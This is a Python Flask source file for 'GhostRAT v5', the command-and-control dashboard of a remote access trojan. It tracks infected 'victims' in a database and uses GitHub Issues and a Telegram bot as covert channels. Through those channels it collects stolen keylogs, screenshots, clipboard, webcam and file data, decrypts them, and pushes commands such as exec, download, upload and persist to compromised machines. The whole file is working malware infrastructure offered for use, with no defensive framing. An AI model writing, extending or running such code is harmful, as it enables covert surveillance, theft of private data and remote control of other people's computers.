"""
GhostRAT v5 — Flask Dashboard
C2 Dashboard for managing victims via GitHub Issues + Telegram.
"""

import json
import os
import time
import hashlib
import sqlite3
import threading
from datetime import datetime, timezone
from functools import wraps

import requests
from flask import (
    Flask, render_template, request, jsonify, session, redirect,
    url_for, flash, abort
)

# ── App ────────────────────────────────────────────────────────────────────────

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH = os.path.join(BASE_DIR, 'config', 'default.json')

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ── Config ─────────────────────────────────────────────────────────────────────

def load_config():
    """Load configuration from JSON file."""
    with open(CONFIG_PATH, 'r') as f:
        return json.load(f)

config = load_config()

# ── SQLite Setup ───────────────────────────────────────────────────────────────

DB_PATH = os.path.join(BASE_DIR, 'ghostrat.db')

def get_db():
    """Get a database connection."""
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    """Initialize the SQLite database."""
    conn = get_db()
    conn.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id TEXT PRIMARY KEY,
            status TEXT DEFAULT 'offline',
            last_heartbeat TEXT,
            os_info TEXT,
            hostname TEXT,
            username TEXT,
            ip_address TEXT,
            commands_received INTEGER DEFAULT 0,
            results_count INTEGER DEFAULT 0,
            created_at TEXT,
            updated_at TEXT
        )
    ''')
    conn.execute('''
        CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id TEXT NOT NULL,
            result_type TEXT NOT NULL,
            data TEXT,
            timestamp TEXT,
            FOREIGN KEY (victim_id) REFERENCES victims(id)
        )
    ''')
    conn.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id TEXT NOT NULL,
            command_type TEXT NOT NULL,
            command_data TEXT,
            status TEXT DEFAULT 'pending',
            timestamp TEXT,
            FOREIGN KEY (victim_id) REFERENCES victims(id)
        )
    ''')
    conn.commit()
    conn.close()

# ── Crypto ─────────────────────────────────────────────────────────────────────

def xor_decrypt(data, key):
    """XOR-decrypt data using the configured key."""
    if not data:
        return data
    key_bytes = key.encode()
    data_bytes = data.encode() if isinstance(data, str) else data
    return bytes(b ^ key_bytes[i % len(key_bytes)] for b in data_bytes).decode('utf-8', errors='replace')

# ── C2 Polling ─────────────────────────────────────────────────────────────────

def poll_github_issues():
    """Poll GitHub Issues for victim data and commands."""
    try:
        headers = {
            'Authorization': f'token {config["github"]["token"]}',
            'Accept': 'application/vnd.github.v3+json'
        }
        url = (
            f'https://api.github.com/repos/'
            f'{config["github"]["repo_owner"]}/{config["github"]["repo_name"]}'
            f'/issues?labels=ghostrat-v5&state=open'
        )
        resp = requests.get(url, headers=headers, timeout=10)
        if resp.status_code != 200:
            return

        issues = resp.json()
        conn = get_db()

        for issue in issues:
            # Extract victim ID from title
            title = issue.get('title', '')
            victim_match = title.lower().startswith('victim:')
            if not victim_match:
                continue

            victim_id = title.split(':', 1)[1].strip()
            if not victim_id:
                continue

            now = datetime.now(timezone.utc).isoformat()

            # Upsert victim
            existing = conn.execute(
                'SELECT id FROM victims WHERE id = ?', (victim_id,)
            ).fetchone()

            if existing:
                conn.execute(
                    'UPDATE victims SET status = ?, last_heartbeat = ?, updated_at = ? WHERE id = ?',
                    ('online', now, now, victim_id)
                )
            else:
                conn.execute(
                    'INSERT INTO victims (id, status, last_heartbeat, created_at, updated_at) VALUES (?, ?, ?, ?, ?)',
                    (victim_id, 'online', now, now, now)
                )

            # Check comments for results
            comments_url = f'https://api.github.com/repos/{config["github"]["repo_owner"]}/{config["github"]["repo_name"]}/issues/{issue["number"]}/comments'
            comments_resp = requests.get(comments_url, headers=headers, timeout=10)
            if comments_resp.status_code == 200:
                comments = comments_resp.json()
                for comment in comments:
                    body = comment.get('body', '')
                    if body.startswith('[PROCESSED]'):
                        continue

                    # Check if it's a result
                    if body.startswith('[RESULT]'):
                        result_type = 'unknown'
                        result_data = body[len('[RESULT]'):].strip()

                        if result_type_map := _parse_result_type(body):
                            result_type = result_type_map
                            result_data = body[len(f'[RESULT:{result_type}]'):].strip()

                        conn.execute(
                            'INSERT INTO results (victim_id, result_type, data, timestamp) VALUES (?, ?, ?, ?)',
                            (victim_id, result_type, result_data, comment.get('created_at'))
                        )

                        # Update victim results count
                        conn.execute(
                            'UPDATE victims SET results_count = results_count + 1 WHERE id = ?',
                            (victim_id,)
                        )

        conn.commit()
        conn.close()

    except Exception as e:
        print(f'[GhostRAT] GitHub poll error: {e}')

def _parse_result_type(body):
    """Extract result type from [RESULT:type] prefix."""
    for rtype in ('keylog', 'screenshot', 'filelist', 'processlist', 'network', 'clipboard', 'webcam'):
        if f'[RESULT:{rtype}]' in body:
            return rtype
    return None

def poll_telegram():
    """Poll Telegram for victim commands and results."""
    try:
        bot_token = config['telegram']['bot_token']
        url = f'https://api.telegram.org/bot{bot_token}/getUpdates'
        resp = requests.get(url, timeout=10)
        if resp.status_code != 200:
            return

        data = resp.json()
        if not data.get('ok') or not data.get('result'):
            return

        conn = get_db()
        now = datetime.now(timezone.utc).isoformat()

        for update in data['result']:
            message = update.get('message', {})
            text = message.get('text', '')
            if not text:
                continue

            chat_id = message.get('chat', {}).get('id')
            if chat_id != config['telegram']['chat_id']:
                continue

            # Check if it's a result
            if text.startswith('[RESULT:'):
                result_type = 'unknown'
                result_data = text
                for rtype in ('keylog', 'screenshot', 'filelist', 'processlist', 'network', 'clipboard', 'webcam'):
                    if text.startswith(f'[RESULT:{rtype}]'):
                        result_type = rtype
                        result_data = text[len(f'[RESULT:{rtype}]'):].strip()
                        break

                # Extract victim ID from message
                victim_id = 'unknown'
                if match := _extract_victim_id(text):
                    victim_id = match

                conn.execute(
                    'INSERT INTO results (victim_id, result_type, data, timestamp) VALUES (?, ?, ?, ?)',
                    (victim_id, result_type, result_data, now)
                )

                # Upsert victim
                existing = conn.execute(
                    'SELECT id FROM victims WHERE id = ?', (victim_id,)
                ).fetchone()

                if existing:
                    conn.execute(
                        'UPDATE victims SET status = ?, last_heartbeat = ?, results_count = results_count + 1, updated_at = ? WHERE id = ?',
                        ('online', now, now, victim_id)
                    )
                else:
                    conn.execute(
                        'INSERT INTO victims (id, status, last_heartbeat, created_at, updated_at) VALUES (?, ?, ?, ?, ?)',
                        (victim_id, 'online', now, now, now)
                    )

        conn.commit()
        conn.close()

    except Exception as e:
        print(f'[GhostRAT] Telegram poll error: {e}')

def _extract_victim_id(text):
    """Extract victim ID from a message."""
    if match := text.match(r'Victim:\s*(\S+)'):
        return match.group(1)
    return None

def start_polling():
    """Start background polling thread."""
    def poll_loop():
        while True:
            try:
                poll_github_issues()
                poll_telegram()
            except Exception as e:
                print(f'[GhostRAT] Poll loop error: {e}')
            time.sleep(config['dashboard']['poll_interval'])

    thread = threading.Thread(target=poll_loop, daemon=True)
    thread.start()

# ── Auth Decorator ─────────────────────────────────────────────────────────────

def login_required(f):
    """Decorator to require authentication."""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# ── Routes ─────────────────────────────────────────────────────────────────────

@app.route('/')
def login():
    """Login page."""
    if session.get('logged_in'):
        return redirect(url_for('dashboard'))
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def do_login():
    """Authenticate user."""
    username = request.form.get('username', '')
    password = request.form.get('password', '')

    if username == config['dashboard']['username'] and password == config['dashboard']['password']:
        session['logged_in'] = True
        session['username'] = username
        return redirect(url_for('dashboard'))

    flash('Invalid credentials', 'error')
    return render_template('index.html')

@app.route('/logout')
def logout():
    """Logout user."""
    session.clear()
    return redirect(url_for('login'))

@app.route('/dashboard')
@login_required
def dashboard():
    """Main dashboard — victim list."""
    return render_template('dashboard.html')

# ── API Routes ─────────────────────────────────────────────────────────────────

@app.route('/api/victims')
@login_required
def api_victims():
    """JSON list of all victims."""
    conn = get_db()
    victims = conn.execute('SELECT * FROM victims ORDER BY last_heartbeat DESC').fetchall()
    conn.close()

    result = []
    for v in victims:
        result.append({
            'id': v['id'],
            'status': v['status'],
            'last_heartbeat': v['last_heartbeat'],
            'os_info': v['os_info'] or 'Unknown',
            'hostname': v['hostname'] or 'Unknown',
            'username': v['username'] or 'Unknown',
            'ip_address': v['ip_address'] or 'Unknown',
            'commands_received': v['commands_received'],
            'results_count': v['results_count'],
            'updated_at': v['updated_at']
        })

    return jsonify(result)

@app.route('/api/victim/<victim_id>')
@login_required
def api_victim(victim_id):
    """Get detailed victim info."""
    conn = get_db()

    victim = conn.execute('SELECT * FROM victims WHERE id = ?', (victim_id,)).fetchone()
    if not victim:
        conn.close()
        return jsonify({'error': 'Victim not found'}), 404

    results = conn.execute(
        'SELECT * FROM results WHERE victim_id = ? ORDER BY timestamp DESC LIMIT 50',
        (victim_id,)
    ).fetchall()

    commands = conn.execute(
        'SELECT * FROM commands WHERE victim_id = ? ORDER BY timestamp DESC LIMIT 50',
        (victim_id,)
    ).fetchall()

    conn.close()

    return jsonify({
        'victim': {
            'id': victim['id'],
            'status': victim['status'],
            'last_heartbeat': victim['last_heartbeat'],
            'os_info': victim['os_info'] or 'Unknown',
            'hostname': victim['hostname'] or 'Unknown',
            'username': victim['username'] or 'Unknown',
            'ip_address': victim['ip_address'] or 'Unknown',
            'commands_received': victim['commands_received'],
            'results_count': victim['results_count'],
            'created_at': victim['created_at'],
            'updated_at': victim['updated_at']
        },
        'results': [dict(r) for r in results],
        'commands': [dict(c) for c in commands]
    })

@app.route('/api/victim/<victim_id>/command', methods=['POST'])
@login_required
def api_send_command(victim_id):
    """Send a command to a victim."""
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data provided'}), 400

    command_type = data.get('type', '')
    command_data = data.get('data', '')

    if not command_type:
        return jsonify({'error': 'Command type required'}), 400

    # Validate command type
    valid_types = (
        'screenshot', 'keylog', 'filelist', 'processlist',
        'exec', 'download', 'upload', 'cleanup', 'persist',
        'network', 'clipboard', 'webcam', 'info', 'beacon'
    )
    if command_type not in valid_types:
        return jsonify({'error': f'Invalid command type. Valid: {valid_types}'}), 400

    conn = get_db()

    # Check victim exists
    victim = conn.execute('SELECT id FROM victims WHERE id = ?', (victim_id,)).fetchone()
    if not victim:
        conn.close()
        return jsonify({'error': 'Victim not found'}), 404

    # Store command
    now = datetime.now(timezone.utc).isoformat()
    conn.execute(
        'INSERT INTO commands (victim_id, command_type, command_data, status, timestamp) VALUES (?, ?, ?, ?, ?)',
        (victim_id, command_type, command_data, 'sent', now)
    )
    conn.execute(
        'UPDATE victims SET commands_received = commands_received + 1, updated_at = ? WHERE id = ?',
        (now, victim_id)
    )
    conn.commit()
    conn.close()

    # Send via GitHub Issues
    _send_command_github(victim_id, command_type, command_data)

    # Send via Telegram
    _send_command_telegram(victim_id, command_type, command_data)

    return jsonify({'status': 'sent', 'victim_id': victim_id, 'command': command_type})

def _send_command_github(victim_id, cmd_type, cmd_data):
    """Send command via GitHub Issue comment."""
    try:
        headers = {
            'Authorization': f'token {config["github"]["token"]}',
            'Accept': 'application/vnd.github.v3+json',
            'Content-Type': 'application/json'
        }
        url = f'https://api.github.com/repos/{config["github"]["repo_owner"]}/{config["github"]["repo_name"]}/issues/comments'
        body = {
            'body': f'GHOST {victim_id} {cmd_type} {cmd_data}'.strip()
        }
        requests.post(url, headers=headers, json=body, timeout=10)
    except Exception as e:
        print(f'[GhostRAT] GitHub command send error: {e}')

def _send_command_telegram(victim_id, cmd_type, cmd_data):
    """Send command via Telegram."""
    try:
        bot_token = config['telegram']['bot_token']
        url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
        payload = {
            'chat_id': config['telegram']['chat_id'],
            'text': f'GHOST {victim_id} {cmd_type} {cmd_data}'.strip()
        }
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f'[GhostRAT] Telegram command send error: {e}')

@app.route('/api/victim/<victim_id>/results')
@login_required
def api_results(victim_id):
    """Get all results for a victim."""
    conn = get_db()
    results = conn.execute(
        'SELECT * FROM results WHERE victim_id = ? ORDER BY timestamp DESC',
        (victim_id,)
    ).fetchall()
    conn.close()

    decrypted_results = []
    key = config['crypto']['key']
    for r in results:
        decrypted_data = xor_decrypt(r['data'], key) if r['data'] else ''
        decrypted_results.append({
            'id': r['id'],
            'result_type': r['result_type'],
            'data': decrypted_data,
            'timestamp': r['timestamp']
        })

    return jsonify(decrypted_results)

@app.route('/api/victim/<victim_id>/export')
@login_required
def api_export(victim_id):
    """Export victim results as JSON."""
    conn = get_db()
    victim = conn.execute('SELECT * FROM victims WHERE id = ?', (victim_id,)).fetchone()

    results = conn.execute(
        'SELECT * FROM results WHERE victim_id = ? ORDER BY timestamp DESC',
        (victim_id,)
    ).fetchall()

    commands = conn.execute(
        'SELECT * FROM commands WHERE victim_id = ? ORDER BY timestamp DESC',
        (victim_id,)
    ).fetchall()
    conn.close()

    export_data = {
        'victim_id': victim_id,
        'exported_at': datetime.now(timezone.utc).isoformat(),
        'victim_info': dict(victim) if victim else {},
        'results': [dict(r) for r in results],
        'commands': [dict(c) for c in commands]
    }

    return jsonify(export_data)

# ── Page Routes ────────────────────────────────────────────────────────────────

@app.route('/victim/<victim_id>')
@login_required
def victim_detail(victim_id):
    """Victim detail page."""
    conn = get_db()
    victim = conn.execute('SELECT * FROM victims WHERE id = ?', (victim_id,)).fetchone()

    if not victim:
        conn.close()
        abort(404)

    results = conn.execute(
        'SELECT * FROM results WHERE victim_id = ? ORDER BY timestamp DESC LIMIT 20',
        (victim_id,)
    ).fetchall()

    commands = conn.execute(
        'SELECT * FROM commands WHERE victim_id = ? ORDER BY timestamp DESC LIMIT 20',
        (victim_id,)
    ).fetchall()
    conn.close()

    return render_template(
        'victim.html',
        victim=victim,
        results=results,
        commands=commands
    )

# ── Init & Run ─────────────────────────────────────────────────────────────────

init_db()
start_polling()

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
